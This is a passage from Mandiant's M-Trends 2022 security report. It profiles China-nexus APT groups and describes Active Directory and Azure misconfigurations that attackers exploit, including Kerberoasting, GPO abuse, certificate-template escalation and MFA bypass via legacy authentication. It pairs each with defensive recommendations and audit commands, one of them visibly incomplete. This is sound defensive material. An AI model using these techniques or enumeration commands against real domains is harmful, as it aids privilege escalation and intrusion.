espionage activity as well as financially motivated activity potentially outside of state
control. Activity attributed to APT41 traces back to 2012, when individual members
of APT41 conducted primarily financially motivated operations focused on the video
game industry before expanding into likely state-sponsored activity. APT41 members
were indicted by the U.S. DOJ in September 2020; however, we continued to observe
operations through 2021.
Conference Crew
Mandiant initially observed Conference Crew predominantly targeting military and
private industry in the U.S. defense and aerospace sector from 2011 to 2017. We also
observed Conference Crew target entities in Southeast Asia, as well as an education
entity in 2021. The group has been around for so long that Mandiant still calls it by an
older, non-APT naming designation.
Outlook
After many breaches, a concerted effort by the U.S., U.K., and other European
governments resulted in a July 2021 statement attributing extensive cyber espionage
operations, including exploits of Microsoft Exchange server vulnerabilities and
ransomware campaigns to China-nexus APTs and clusters of activity. While China
appears to have refrained from conducting destructive cyber-attacks that cause
overt damage to critical infrastructure, it has used disruptive attacks as well as
disinformation campaigns to help enforce censorship policies within its own borders.
Mandiant continues to track information operations campaigns we assess with
high confidence to be operating in a coordinated, inauthentic manner in support
of the political interests of the PRC. Given the more aggressive nature of Beijing’s
international diplomacy, along with the broader cyber espionage campaigns
conducted by China-nexus threat actors, we anticipate that cyber espionage activity
in support of China’s national security and economic interests will continue to
accelerate in the coming year.

COMMON
MISCONFIGURATIONS
THAT LEAD TO
COMPROMISE
83
Active Directory is the most commonly used on-premises identity provider solution
across organizations, used by approximately 90% of the Global Fortune 1000.17 With
the rise of cloud adoption and integration, Active Directory is now commonly used in
a hybrid model to manage and sync user identities for both on-premises and cloud
environments. Many organizations use on-premises Active Directory to synchronize
identities with Azure Active Directory to achieve a single integrated identity solution
for accessing applications and services.
Based on Mandiant incident response investigations, we have observed
misconfigurations with the hybrid identity model, which has resulted in privilege
escalation, vertical movement and persistence by adversaries.
On-Premises Misconfigurations
Kerberoasting highly privileged user account-based
Service Principal Names
A service principal name (SPN) within Active Directory is a representation of a service
instance. An SPN can be registered for a computer or user account to associate a
service instance. For an account configured with an SPN, any authenticated account
within Active Directory can request and receive the Ticket Granting Service (TGS)
ticket for the associated SPN account, which will be encrypted with the account’s
password hash. Adversaries commonly target SPNs registered with high privileged
user accounts to extract the password hash and escalate privileges within Active
Directory. This technique is referred to as Kerberoasting.
Figure 3. PowerShell cmdlet to Identify User (non-computer) Accounts Configured with an SPN.
Get-ADUser -filter {(ServicePrincipalName -like “*”)}
Mandiant recommends generating strong, unique passwords (for example, 25+
characters) and changing passwords regularly for user (non-computer) accounts
configured with SPNs. Furthermore, permissions should be reviewed and reduced
for these accounts to ensure that the concept of least-privilege is enforced. This
process can be automated by using Managed Service Accounts (MSAs) for non-
computer accounts that require an SPN association. MSAs provide automatic
password management and the ability to delegate account management to specific
administrators.
17. Frost and Sullivan (March 20, 2020). Active Directory Holds the Keys to your Kingdom, but is it Secure?
SPECIAL REPORT | MANDIANT M-TRENDS 2022 84
GPO edit permissions for non-privileged users
Group Policy Objects (GPO) are used to centrally configure and manage user and
computer security settings within Active Directory. Privileged users with delegated
rights can modify GPO settings, which can ultimately impact the security state for
objects within Active Directory. Organizations often delegate permissions to modify
GPOs to specific security groups and accounts. Examples of default security groups
with permissions to modify GPOs include:
• Domain Admins
• Enterprise Admins
• Group Policy Creator Owners
Adversaries often target and compromise accounts in specific groups that can
edit GPOs to modify domain-based security settings. Ransomware operators use
this technique to push malicious binaries (encryptors) to many systems in short
timeframe. Adversaries can also abuse GPOs to gain privileged access on endpoints.
By modifying user rights assignment settings they can obtain local administrative
permissions or configure services for persistent access.
Mandiant recommends organizations review GPO settings to identify groups and
accounts that have GPO edit permissions. These represent an extended attack
surface for hardening and protection.

$GPOPermission = Foreach ($GPO in (Get-GPO -All | Where-Object {$_.DisplayName -like “*”})){

New-Object PSObject -property @{GPO=$GPO.DisplayName;Trustee=$Perm.Trustee.Name;Permission=$Perm.
Permission}
} }
$GPOPermission | Select-Object GPO,Trustee,Permission
Privileged user account usage over non-tier 0 assets
In 2021, Mandiant continued to observe flat Active Directory architectures that
allowed highly privileged accounts to be used for access across all endpoints. This
resulted in privileged account credentials being exposed on endpoints (in memory)
and then accessed and used by attackers using various credential dumping tools
such as Mimikatz. Authentication methods that expose credentials in memory on
endpoints include:
• Interactive logons
• Logons using Remote Desktop Protocol (RDP)
• RunAs – Allows a user to execute binaries in the context of another specified account
• runas /noprofile /user:\administrator cmd.exe
(Figure 2 Cmdlet to run cmd.exe within the context of the account “Administrator”)
• PowerShell WinRM with CredSSP
• PsExec with explicit credentials
SPECIAL REPORT | MANDIANT M-TRENDS 2022 85
Mandiant recommends that organizations implement explicit restrictions that only
allow for privileged accounts to be used from specific privileged access workstations
or Tier 0 assets that reside in restricted and protected VLANs and segments. This
can be achieved by enforcing an Active Directory architecture with a tiering model
that restrict account usage across a category of assets (Tier 0–Tier 2). Guardrail
enforcement and logon restrictions for privileged accounts can be defined within
GPOs (user rights assignments) or by using authentication policy silos (Windows
Server 2012 R2 domain-functional level or above).
Use of unconstrained delegation
In Active Directory, delegation allows a service to impersonate the client for a
single sign-on experience. When unconstrained delegation is enabled on a front-
end service, the service can receive the Kerberos ticket of the user who requests
access to the destination service. Adversaries often target and compromise systems
enabled with unconstrained delegation to extract Kerberos tickets from memory and
impersonate accounts within an environment. If privileged accounts are accessing
endpoints configured with unconstrained delegation, this can lead to privilege
escalation within a domain.
Mandiant recommends that organizations identify endpoints configured with
unconstrained delegation and migrate them to use constrained delegation for
specific services only.

Figure 6. PowerShell cmdlet to List Privileged Users that can be Delegated.
Get-ADUser -Filter {(AdminCount -eq 1) -and (AccountNotDelegated -eq $false)}
Beginning with Microsoft Windows Server 2012 R2 and Windows 8.1, the “Protected
Users” security group was introduced to manage credential exposure for privileged
accounts. Members of this group automatically have non-configurable protections
applied to their accounts, including:
• The Kerberos ticket granting ticket (TGT) expires after four hours, rather than the
normal 10-hour default setting.
• Cached credentials are blocked; a domain controller must be available to
authenticate the account.
• Plaintext passwords are not cached for Windows Digest authentication or default
credential delegation (CredSSP), regardless of the endpoint’s applied policy
settings.
• NTLM one-way function (NTOWF) is blocked.
• DES and RC4 cannot be used for Kerberos pre-authentication (Server 2012 R2 or
higher).
• Accounts cannot be used for either constrained or unconstrained delegation
SPECIAL REPORT | MANDIANT M-TRENDS 2022 86
For privileged accounts that do not explicitly require an option for delegation,
Mandiant recommends enabling “Account is sensitive and cannot be delegated”
within the “Account” tab for the accounts using Active Directory Users and
Computers. This setting will restrict the account accordingly.
Figure 7. Check the Box for “Account is sensitive and cannot be delegated”.
Certificate template permits Domain Admin escalation
Active Directory Certificate Services (AD CS) is a Microsoft platform that offers
public key infrastructure (PKI) functionality to facilitate capabilities such as
Encrypting File System (EFS), domain authentication, digital signatures and email
security. AD CS Certification Authorities (CA) issue certificates based on the
Certificate Signing Request (CSR) from the user or machine based on published
templates. Templates define parameters such as certificate validity, certificate
usage and application policy permissions for security principals.
A common misconfiguration that Mandiant observed was certificate templates
that could permit the requestor to specify a subject alternate name (SAN). If a
template enables certificate requests with both domain authentication and a SAN,
an authenticated domain user could potentially request and receive a certificate with
a privileged account included as a SAN. The authenticated domain user could then
access domain-based resources within the context of the privileged user.
Figure 8. Certificate Template to Allow Subject Alternate Name.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 87
Recommended hardening configurations to secure Microsoft
Certificate Authority (CA) servers:
• Treat CAs and subordinate CAs as Tier 0 assets and enforce logon restrictions to
minimize the scope of accounts with elevated access for certificate servers.
• Enforce multi-factor authentication (MFA) for CA management access.
• Review published certificate templates to ensure that suspicious or malicious
templates have not been introduced.
Figure 9. Windows command line program to Display Published Templates.
certutil.exe -TCAInfo
• Review the security permissions assigned to all published certificate templates
and validate the scope of enrollment and write permissions delegated to security
principals.
Figure 10. Windows command line program to Display Permissions of Published Templates.
certutil.exe -v -dsTemplate
• Enforce manager approvals for certificate signing request (CSR) templates that
allow for a SAN.
• Review certificate policies to verify if the EDITF_ATTRIBUTESUBJECTALTNAME2
configuration is included. This configuration within a certificate policy allows for
a certificate authority to permit SAN information to be included as part of the
certificate signing request. This setting applies to the entire certificate authority,
and all other certificate templates issued by that certificate authority.
Figure 11. Windows command line program to Validate the Existence of the Flag EDITF_
ATTRIBUTESUBJECTALTNAME2.
certutil.exe –getreg policy
• For the use of templates with sensitive Enhanced Key Usage (EKU), limit enrollment
permissions to predefined users or groups. Certificates with EKU can be used for
multiple purposes.
• Audit and review the NTAuthCertificates container in Active Directory to validate
the referenced CA certificates. The NTAuthCertificates AD object defines CA
certificates that enable authentication within Active Directory. This object has
an array of trusted CA certificates. Before authenticating a principal, AD checks
the NTAuthCertificates object entry for the CA specified in the authenticating
certificate’s Issuer field to validate the authenticity of the CA.
• Protect CA private keys at the hardware level using a Hardware Security Module
(HSM) to avoid private key theft that uses DPAPI backup protocols.
• Enable audit logging for certificate services on CA servers and monitor the
certificate enrollment process and CA backup events.
• Monitor Domain Controller certificate-based authentication events.
• Use public tools such as PSPKIAudit to validate and identify misconfigurations in
certificate templates
SPECIAL REPORT | MANDIANT M-TRENDS 2022 88
Microsoft Azure and Microsoft 365 Configuration Risks
Throughout 2021, many organizations continued to expand the scope of migrating
applications, services and data from off-premises to cloud-hosted infrastructure.
Adversaries correspondingly augmented their efforts in developing novel and
sophisticated techniques to target identities and data housed in cloud environments
such as Microsoft Azure and Microsoft SaaS platforms (Microsoft 365).
Identities without multi-factor authentication (MFA)
enforcement resulted in unauthorized access
Mandiant continued to observe that organizations not enforcing multi-factor
authentication (MFA) to protect identities and access to cloud-based infrastructure
fell victim to adversaries using either stolen credentials or password spraying to
gain unauthorized access to cloud-hosted applications and data. Not only were
adversaries using these techniques to target cloud-based resources; on-premises
applications were also susceptible. Such applications included VPN gateways,
remote access services, virtual desktop infrastructure (VDI) and email and
messaging services.
Mandiant recommends that organizations not only enforce strong and complex
password policies for accounts, but require the use of MFA to access external-facing
resources from remote or untrusted locations. Organizations can use Azure AD
features such as Conditional Access policies (CAPs) to enforce MFA and Azure AD
password protections to restrict the use of known or weak passwords commonly
susceptible to password-spraying attacks.
Legacy authentication to bypass MFA in Azure AD
One of the most common methods used by attackers to gain access to Azure tenants
is credential theft or password spraying with legacy authentication protocols.
Legacy authentication protocols do not support MFA and (if enabled) can be used to
gain access to hosted data and resources via Azure AD.
Some commonly known legacy authentication protocols that can be
used to gain access to Microsoft 365 include:
• Exchange Active Sync (EAS)
• Autodiscover
• IMAP4
• MAPI over HTTP (MAPI/HTTP)
• Offline Address Book (OAB)
• Outlook Service
• POP3
• Reporting Web Services
• Exchange Representational State Transfer (REST)
• Outlook Anywhere (RPC over HTTP)
• Authenticated SMTP
• ActiveSync
SPECIAL REPORT | MANDIANT M-TRENDS 2022 89
Modern authentication capabilities include multi-factor authentication (MFA) using
smart cards, certificate-based authentication (CBA) and third-party SAML identity
providers. Modern authentication is based on the Active Directory Authentication
Library (ADAL) and OAuth v2.0. Mandiant recommends that organizations determine
if legacy authentication protocols are enabled for Microsoft 365 access, and
implement either the Security Defaults feature or Conditional Access policies that
disable legacy authentication protocols and enforce modern authentication.
Accounts or applications that require basic (legacy) authentication should have
Conditional Access policies enforced to restrict use to trusted IP ranges. In the
long-term, accounts and applications should be upgraded to support modern
authentication.
Figure 12. PowerShell cmdlet to Verify the Modern Authentication Settings for a M365 Tenant.
Get-OrganizationConfig | Format-Table -Auto Name,OAuth*
Privileged Identities Synced from On-Premises Infrastructure
Mandiant continued to observe adversaries compromising on-premises accounts
configured with global administrative (or elevated) permissions within Azure AD,
enabling vertical movement from on-premises to the cloud. In many instances,
organizations had conditional access policies configured to not require MFA when
accessing Azure from trusted IP ranges (correlating to the IP ranges used for
on-premises configurations). Once an adversary had access to the on-premises
infrastructure, they could move vertically to the cloud, create new accounts and
further expand the scope of their access.
Mandiant recommends that organizations review the scope of on-premises accounts
synced to Azure AD and have the Global Administrator role (and additional elevated
roles)assigned. If accounts are assigned elevated roles, organizations should either
configure them as dedicated cloud-only accounts (that require MFA regardless of
location) or use Microsoft Privileged identity Management (PIM) to enforce both time-
and approval-based role assignments.
Relaxed firewall rules on cloud-hosted virtual machines
Overly permissive firewall rules were another common trend observed in 2021. They
allowed an adversary to remotely access external-facing virtual machines hosted
in cloud tenants. An adversary that remotely accesses virtual machines can extract
data, deploy ransomware binaries or malicious backdoors and either move laterally
within the cloud tenant or vertically to on-premises infrastructure.
Mandiant recommends that organizations filter the scope of network traffic that can
flow in and out of virtual network subnets and network interfaces using a stringent
Azure network security group. A network security group contains security rules that
allow or deny inbound network traffic to, or outbound network traffic from, several
types of Azure components.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 90
Unused ports and protocols should be removed; threat actors can use them to gain
initial access, move laterally, and potentially steal sensitive data. At a minimum,
ports and protocols commonly used for remote management should be blocked from
external networks. Example ports and protocols include:
• SMB (TCP/445, TCP/135, TCP/139)
• Remote Desktop Protocol (TCP/3389)
• Windows Remote Management (WinRM)/Remote PowerShell (TCP/80,
TCP/5985, TCP/5986)

Overly-permissive roles assigned to non-privileged users
Azure role-based access control (RBAC) is the control point for authorization to
access Azure resources. To provide access, roles need to be assigned to either
cloud-only or synchronized accounts. In 2021, Mandiant observed overly-permissive
roles being assigned to non-privileged accounts. Once compromised, these non-
privileged accounts were used by adversaries to elevate privileges to move laterally,
compromise additional accounts and resources and access data housed in either
Azure or on-premises infrastructure. Azure subscription roles commonly exploited
by adversaries include:
• The Contributor role, used to manage and make changes over resources contained
within the subscription. Adversaries can abuse this role to extract data from
resources such as databases and storage accounts within a subscription
• The Virtual Machine Contributor role, used to manage all virtual machines.
Adversaries can abuse this role using various tactics, such as via the Azure Run
Command interface to deploy backdoors or ransomware, extract credentials and
data and move vertically to on-premises infrastructure. Adversaries can also delete
virtual machine instances using this role and impact the availability of applications
and services accessible using virtual machines.
• The Application Administrator role is used to manage applications registered
within Azure AD. Adversaries can abuse this role by configuring and associating
passwords or certificates with applications for persistent access and to elevate
privileges within an Azure tenant.
• The Application Impersonation role in Exchange Online, used by adversaries to
read and send emails as any user within an Microsoft 365 subscription.
Mandiant recommends that organizations transition away from assigning permanent
privileged roles to designated accounts and focus on integrating a just-in-time
method for approving and assigning elevated roles. Within Azure, Microsoft PIM is
a scalable solution that provides both time and approval-based role assignments,
integrated with access criteria and full auditing capabilities.
SPECIAL REPORT | MANDIANT M-TRENDS 2022 91
Illicit consent grants attacks
Adversaries often create and register malicious applications with Azure to attempt
to gain persistent access to data and applications such as Exchange Online. Mandiant
observed adversaries exploiting this method of access when organizations had
allowed non-privileged users to approve consents for external applications to access
data housed in Azure or Microsoft 365. Adversaries could use a phishing attack
to trick a user into providing the consent required for this level of access. Once a
malicious application has been granted consent, it collects the access token and has
account-level access to data without the need for the user’s credentials.
Mandiant recommends that organizations review their Azure and Microsoft 365
subscription configuration settings and verify hardening settings:
• Enforce user-consent settings so users cannot consent to allow third-party
application access. Application consents can also be restricted to only allow
applications from verified publishers or for specific low-risk permissions.
• Regularly review consented permissions for external applications.
• Implement an application governance policy to monitor third-party application
behavior. Microsoft Cloud App Security (MCAS) can be used to detect risky OAuth
Applications and to review application permissions in the Azure portal.
Risky Azure API permissions delegated to single or
multi-tenant applications
An Azure registered application can use applications or delegated permissions
without an interactive user signed into the application. Such permissions require
administrator consent. After an administrator provides consent, the permissions are
assigned to the service principal associated with the application.
In 2021, Mandiant identified instances where an adversary compromised an account
assigned the Application Administrator role in Azure, which gave the adversary a way
to gain persistent access. They could add either an application or service principal
credential (password or certificate) to use the legitimate permissions assigned to the
application. In some instances, the applications were assigned permissions within
multiple Azure (consumer) tenants, opening the pathway for a supply chain attack.
The adversary could pose as an authorized (trusted) application and move laterally
across various consumer tenants.
Mandiant recommends that organizations review the API permissions assigned
to applications and understand the scope of permissions assigned to registered
applications in Azure. Application behavior can be monitored using playbooks. Use
Azure native features such as Azure Monitor Workbooks to analyze application usage.
Azure Monitor Workbooks can be used for data analysis and to create visualization
reports. Organizations should also perform periodic reviews of both applications and
service principals configured with credentials and proactively rotate the credentials
periodically.

The cyber threat landscape is vast and deep and regularly influenced by the world
around us. When the COVID-19 pandemic began, we observed an uptick in targeting
of healthcare and research and development. Now, at the time of publishing M-Trends
2022, the situation unfolding in Ukraine shows how tightly the geopolitical and cyber
worlds are intertwined.
Our mission at Mandiant is to ensure every organization is secure from cyber threats
and confident in their readiness. The annual M-Trends report represents significant
effort towards advancing that mission with the use of data and learnings from our
incident response engagements.
The global median dwell time is now 21 days, down from 24 days last year, which is
a downward trend we like to see. A trend we don’t like to see is the continued use of
ransomware and multifaceted extortion. With low risks and barrier to entry and high
rewards, we see this as an ongoing threat posing a risk to every organization.
Preparation is vital not just for ransomware but all types of attacks, whether through
red teaming, tabletop exercises, training or other techniques. Sound fundamentals,
such as vulnerability and patch management, least privilege and hardening also play
a role in building strong defenses. Our case study involving coinminers illustrates the
value of logging and following up on alerts, since the investigation eventually led to
even more significant threats.
The heart of any cyber defense capability is the intelligence that drives it, and the
best threat intelligence is gleaned directly from the frontlines. Mandiant will continue
to share its frontline knowledge in M-Trends to improve our collective security
awareness, understanding and capabilities—and to ensure that organizations can stay
relentless in their cyber security efforts.
